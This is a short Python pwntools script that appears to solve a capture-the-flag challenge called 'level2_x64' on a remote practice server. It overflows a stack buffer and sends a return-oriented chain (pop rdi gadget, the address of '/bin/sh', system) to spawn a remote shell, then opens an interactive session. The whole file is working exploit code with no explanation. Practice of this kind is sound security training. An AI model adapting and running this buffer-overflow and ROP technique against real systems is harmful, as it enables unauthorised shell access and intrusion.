from pwn import *

context.log_level = 'debug'

#p = process('./level2_x64')
p = remote('node3.buuoj.cn', 27889)

bin_sh_addr = 0x600a90
pop_rdi_ret = 0x4006b3
system_addr = 0x400603

p.recvuntil('Input:')

payload = b'a' * ( 0x80 + 8 ) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)

p.sendline(payload)

p.interactive()
